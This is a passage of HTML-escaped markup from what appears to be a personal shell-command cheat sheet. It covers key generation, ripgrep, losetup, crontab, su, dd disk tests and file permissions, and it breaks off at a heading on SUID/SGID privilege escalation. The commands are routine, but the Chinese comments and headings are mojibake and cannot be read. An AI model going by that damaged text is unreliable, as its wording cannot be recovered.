&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ›´å¥½çš„ export ç¯å¢ƒå˜é‡çš„æ–¹æ³•ï¼Œé¿å…å°†æ•æ„Ÿä¿¡æ¯æš´éœ²åœ¨å‘½ä»¤è¡Œå†å²è®°å½•ä¸­&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">XXX_KEY&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>cat&lt;span class="k">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># macOS è®¿é—®å‰ªè´´æ¿ï¼Œå°†æ–‡æœ¬å†™å…¥å‰ªè´´æ¿&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> hello &lt;span class="p">|&lt;/span> pbcopy
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># macOS è¯»å–å‰ªè´´æ¿&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pbpaste
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç”Ÿæˆä¸€ä¸ª 32 å­—èŠ‚çš„ url safe çš„ secret key&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 -c &lt;span class="s1">&amp;#39;import secrets; print(secrets.token_urlsafe(32))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç”Ÿæˆä¸€ä¸ª 32 å­—èŠ‚çš„ hex secret key&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 -c &lt;span class="s1">&amp;#39;import secrets; print(secrets.token_hex(32))&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="filesystem">Filesystem&lt;/h2>
&lt;h3 id="losetup">losetup&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># bind the file test.img to loop device /dev/loop0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">losetup /dev/loop0 test.img
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mkfs.ext4 /dev/loop0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mount -o discard /dev/loop0 /mnt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># list all loop devices&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">losetup -la
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="network">Network&lt;/h1>
&lt;p>&lt;a href="https://mincodes.com/posts/network-tools/">Network Tools ç½‘ç»œå·¥å…·ç®±&lt;/a> ã€‚&lt;/p>
&lt;h2 id="fd">fd&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥æ‰¾å¤šç§æ‰©å±•å&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fd &lt;span class="s1">&amp;#39;.(java|kt)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">fd &lt;span class="s1">&amp;#39;.(java|kt)&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> xargs rg -U &lt;span class="s1">&amp;#39;\bLiveStream\s*\(&amp;#39;&lt;/span> -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="rg">rg&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -lï¼Œä»…æ‰“å°åŒ¹é…çš„æ–‡ä»¶åï¼Œå¿½ç•¥åŒ¹é…åˆ°çš„å†…å®¹&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rg -l LiveStream
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -vï¼Œåå‘åŒ¹é…ï¼ˆè¿‡æ»¤æ‰åŒ¹é…åˆ°çš„ï¼‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rg -l LiveStream &lt;span class="p">|&lt;/span> rg -v getLiveStream
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># &amp;#39;\b&amp;#39;, åŒ¹é… word è¾¹ç•Œ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rg -l &lt;span class="s1">&amp;#39;\bLiveStream\(&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># &amp;#39;\s&amp;#39;, åŒ¹é…ç©ºç™½å­—ç¬¦&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rg &lt;span class="s1">&amp;#39;\bLiveStream\s*\(&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -U, åŒ¹é…å¤šè¡Œæ–‡æœ¬&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rg -U &lt;span class="s1">&amp;#39;\bLiveStream\s*\(&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="xargs">xargs&lt;/h2>
&lt;p>xargs on Mac OSï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">find . -iname something &lt;span class="p">|&lt;/span> xargs -I &lt;span class="o">{}&lt;/span> mv &lt;span class="o">{}&lt;/span> /dest/path
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find /tmp/ -ctime -1 -name &lt;span class="s2">&amp;#34;x*&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> xargs -I &lt;span class="s1">&amp;#39;{}&amp;#39;&lt;/span> mv &lt;span class="s1">&amp;#39;{}&amp;#39;&lt;/span> ~/play/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="crontab">Crontab&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ¯ 10 åˆ†é’Ÿè¿è¡Œä¸€æ¬¡&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*/10 * * * * &lt;span class="nb">command&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¼€æœºè‡ªå¯åŠ¨ï¼šæ¯æ¬¡ç³»ç»Ÿé‡å¯æ—¶ï¼Œéƒ½ä¼šè¿è¡Œ ss.sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">@reboot ss.sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å‚è€ƒï¼š&lt;a href="https://crontab.guru/every-10-minutes">https://crontab.guru/every-10-minutes&lt;/a>&lt;/p>
&lt;h2 id="äºŒè¿›åˆ¶å·¥å…·">äºŒè¿›åˆ¶å·¥å…·&lt;/h2>
&lt;p>äºŒè¿›åˆ¶ dump å·¥å…·&lt;/p>
&lt;ul>
&lt;li>&lt;code>xxd&lt;/code>
ä»¥åå…­è¿›åˆ¶å½¢å¼ dump æ–‡ä»¶å†…å®¹&lt;/li>
&lt;li>&lt;code>xxd -b&lt;/code>
ä»¥äºŒè¿›åˆ¶å½¢å¼ dump æ–‡ä»¶å†…å®¹&lt;/li>
&lt;li>&lt;code>xxd -r&lt;/code>
ä» dump å†…å®¹è¿˜åŸå‡ºåŸå§‹æ–‡ä»¶ï¼Œä¾‹å¦‚ &lt;code>xxd file | xxd -r&lt;/code> å’Œ
&lt;code>cat file&lt;/code> çš„è¾“å‡ºæ˜¯ä¸€è‡´çš„&lt;/li>
&lt;/ul>
&lt;p>æŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²ï¼ˆfind printable stringsï¼‰ï¼Œä¾‹å¦‚ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥çœ‹ /bin ç›®å½•ä¸‹çš„ç¨‹åºå¯èƒ½ä¼šåˆ›å»ºå“ªäº›ä¸´æ—¶æ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strings /bin/* &lt;span class="p">|&lt;/span> grep tmp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ä»£ç†ç›¸å…³">ä»£ç†ç›¸å…³&lt;/h2>
&lt;p>å¦‚æœä½ çš„ &lt;em>http_proxy&lt;/em> éœ€è¦ç™»å½•ï¼Œå¯ä»¥è®¾ç½®å¦‚ä¸‹ï¼š&lt;/p>
&lt;p>&lt;code>export http_proxy=http://username:password@host:port&lt;/code>&lt;/p>
&lt;h2 id="è¿‡æ»¤æŠ¥å‘Šç›¸åŒè¡Œ">è¿‡æ»¤ã€æŠ¥å‘Šç›¸åŒè¡Œ&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;code>uniq&lt;/code>&lt;/p>
&lt;p>ç›¸åŒè¡Œä»…æ‰“å°ä¸€æ¬¡&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>uniq -c&lt;/code>
è¡Œé¦–æ’å…¥è¯¥è¡Œé‡å¤å‡ºç°çš„æ¬¡æ•°&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>uniq -d&lt;/code>
ä»…è¾“å‡ºç›¸åŒè¡Œ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>uniq -u&lt;/code>
ä»…è¾“å‡ºä¸åŒè¡Œ&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="ç³»ç»Ÿç®¡ç†ç›¸å…³">ç³»ç»Ÿç®¡ç†ç›¸å…³&lt;/h2>
&lt;h3 id="ç”¨æˆ·ç®¡ç†">ç”¨æˆ·ç®¡ç†&lt;/h3>
&lt;p>&lt;code>usermod -a -G sudo user1&lt;/code> å°† user1 å¢åŠ åˆ° sudo ç»„&lt;/p>
&lt;p>&lt;code>su - user&lt;/code>&lt;/p>
&lt;p>å½“ä½ ä½¿ç”¨å¸¦æœ‰ç ´æŠ˜å·çš„ &lt;code>su - user1&lt;/code> å‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š&lt;/p>
&lt;ol>
&lt;li>åˆ‡æ¢åˆ° &lt;code>user1&lt;/code> è´¦æˆ·ã€‚&lt;/li>
&lt;li>é‡æ–°åˆå§‹åŒ–ç¯å¢ƒå˜é‡ï¼ŒåŒ…æ‹¬ &lt;code>PATH&lt;/code>ã€&lt;code>HOME&lt;/code>ã€&lt;code>SHELL&lt;/code> ç­‰ï¼Œä½¿å…¶ä¸ &lt;code>user1&lt;/code> çš„é»˜è®¤è®¾ç½®ä¸€è‡´ã€‚è¿™äº›è®¾ç½®é€šå¸¸åœ¨ &lt;code>/etc/passwd&lt;/code> æ–‡ä»¶å’Œ &lt;code>user1&lt;/code> çš„é…ç½®æ–‡ä»¶ï¼ˆå¦‚ &lt;code>.bashrc&lt;/code>ã€&lt;code>.bash_profile&lt;/code> ç­‰ï¼‰ä¸­å®šä¹‰ã€‚&lt;/li>
&lt;li>å°†å·¥ä½œç›®å½•åˆ‡æ¢åˆ° &lt;code>user1&lt;/code> çš„ä¸»ç›®å½•ã€‚&lt;/li>
&lt;li>å¦‚æœå®šä¹‰äº†ç™»å½•è„šæœ¬ï¼ˆå¦‚ &lt;code>.bash_profile&lt;/code> æˆ– &lt;code>.profile&lt;/code>ï¼‰ï¼Œåˆ™æ‰§è¡Œè¿™äº›è„šæœ¬ã€‚&lt;/li>
&lt;/ol>
&lt;p>ä½¿ç”¨ä¸å¸¦ç ´æŠ˜å·çš„ &lt;code>su user1&lt;/code> å‘½ä»¤æ—¶ï¼Œåªä¼šåˆ‡æ¢åˆ° &lt;code>user1&lt;/code> è´¦æˆ·ï¼Œä½†ä¸ä¼šé‡ç½®ç¯å¢ƒå˜é‡æˆ–æ›´æ”¹å·¥ä½œç›®å½•ã€‚è¿™æ„å‘³ç€ï¼Œå³ä½¿ä½ å·²ç»åˆ‡æ¢åˆ°äº†å¦ä¸€ä¸ªç”¨æˆ·ï¼Œå½“å‰ç¯å¢ƒä»ç„¶ä¿ç•™äº†åŸå§‹ç”¨æˆ·çš„è®¾ç½®ã€‚&lt;/p>
&lt;p>æ€»ä¹‹ï¼Œä½¿ç”¨å¸¦æœ‰ç ´æŠ˜å·çš„ &lt;code>su - user1&lt;/code> å‘½ä»¤å¯ä»¥æ›´å¥½åœ°æ¨¡æ‹Ÿä¸€ä¸ªå®Œæ•´çš„ç™»å½•ç¯å¢ƒï¼Œè€Œä¸ä»…ä»…æ˜¯åˆ‡æ¢ç”¨æˆ·ã€‚åœ¨éœ€è¦ä»¥å¦ä¸€ä¸ªç”¨æˆ·çš„å®Œæ•´ç¯å¢ƒæ‰§è¡Œä»»åŠ¡æ—¶ï¼Œå»ºè®®ä½¿ç”¨å¸¦ç ´æŠ˜å·çš„ &lt;code>su -&lt;/code> å‘½ä»¤ã€‚&lt;/p>
&lt;p>&lt;code>script /dev/null&lt;/code>
è¯¥å‘½ä»¤å¯ä»¥è§£å†³ su åˆ‡æ¢ç”¨æˆ·åï¼Œè¿è¡Œ screen ç¨‹åºæ—¶æŠ¥é”™ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">Cannot open your terminal &amp;#39;/dev/pts/0&amp;#39; - please check.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>çš„é—®é¢˜ã€‚&lt;/p>
&lt;p>åŸç†æ˜¯ &lt;code>script&lt;/code> å‘½ä»¤ä¼šå¼€å¯ä¸€ä¸ªæ–°çš„ä¼ªç»ˆç«¯ï¼ˆpseudo-terminalï¼‰ï¼Œç”¨æ¥ dump ç»ˆç«¯ä¸Šçš„æ‰€æœ‰è¾“å‡ºã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥çœ‹ CPU æ€»æ ¸å¿ƒæ•°&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">grep -c &lt;span class="s1">&amp;#39;model name&amp;#39;&lt;/span> /proc/cpuinfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŸ¥çœ‹ã€é…ç½®èµ„æºé™åˆ¶&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ulimit&lt;/span> -a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="æµ‹è¯•ç¡¬ç›˜é€Ÿåº¦">æµ‹è¯•ç¡¬ç›˜é€Ÿåº¦&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># bs é»˜è®¤ä¸º 512 å­—èŠ‚ï¼Œå•ä½æ”¯æŒ k/m ï¼ˆmacOS å¹³å°å¦‚æ­¤ï¼ŒLinux ä¸Šä¸ä¸€æ ·ï¼‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># write&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dd &lt;span class="nv">of&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">path_on_disk&lt;/span>&lt;span class="si">}&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="o">=&lt;/span>/dev/zero &lt;span class="nv">bs&lt;/span>&lt;span class="o">=&lt;/span>1m &lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># read&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dd &lt;span class="k">if&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">path_on_disk&lt;/span>&lt;span class="si">}&lt;/span> &lt;span class="nv">of&lt;/span>&lt;span class="o">=&lt;/span>/dev/null &lt;span class="nv">bs&lt;/span>&lt;span class="o">=&lt;/span>1m
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ç›‘æ§ç£ç›˜-io-æƒ…å†µ">ç›‘æ§ç£ç›˜ IO æƒ…å†µ&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">iostat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl"> disk0 disk2 disk3 cpu load average
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> KB/t tps MB/s KB/t tps MB/s KB/t tps MB/s us sy id 1m 5m 15m
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 26.18 95 2.42 25.87 0 0.00 287.74 0 0.00 4 2 94 1.95 1.64 1.56
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="æ–‡ä»¶æƒé™">æ–‡ä»¶æƒé™&lt;/h3>
&lt;p>&lt;img src="https://mincodes.com/uploads/images/25e5f918-7808-4a5d-805f-2bfb353353b6/Untitled.png" alt="">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ›´æ”¹æ–‡ä»¶å±ç»„&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chgrp &lt;span class="o">[&lt;/span>-R&lt;span class="o">]&lt;/span> group filename
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ›´æ”¹æ–‡ä»¶å±ä¸»&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chown &lt;span class="o">[&lt;/span>-R&lt;span class="o">]&lt;/span> owner filename
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chown &lt;span class="o">[&lt;/span>-R&lt;span class="o">]&lt;/span> owner:group filename
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ›´æ”¹æ–‡ä»¶å±æ€§&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod &lt;span class="nv">u&lt;/span>&lt;span class="o">=&lt;/span>rwx,g&lt;span class="o">=&lt;/span>rx,o&lt;span class="o">=&lt;/span>r test1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod a-x test1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>SUID, SGID, sticky bit&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ä¸ºç¨‹åºè®¾ç½® SGID, ç¨‹åºå°†ä»¥æ–‡ä»¶æ‰€å±ç»„çš„æƒé™è¿è¡Œ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod g+s executable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ä¸ºç¨‹åºè®¾ç½® SUID, ç¨‹åºå°†ä»¥æ–‡ä»¶å±ä¸»çš„æƒé™è¿è¡Œ&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod u+s executable
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ä¸ºç›®å½•è®¾ç½® SGID, è¯¥ç›®å½•ä¸‹æ–°å»ºçš„æ–‡ä»¶æˆ–ç›®å½•çš„ç»„å°†é»˜è®¤ä¸ºè¯¥ç›®å½•çš„ç»„&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod g+s directory
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è®¾ç½® sticky bit, è¯¥ç›®å½•ä¸‹æ–°å»ºçš„æ–‡ä»¶æˆ–ç›®å½•ä¸èƒ½è¢«éowneråˆ é™¤ï¼ˆè¯¥ç›®å½•çš„å±ä¸»æ˜¯ä¸ªä¾‹å¤–ï¼Œå¯ä»¥åˆ é™¤ä»»æ„æ–‡ä»¶ï¼‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod +t directory
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>SUID/SGID ææƒ&lt;/p>
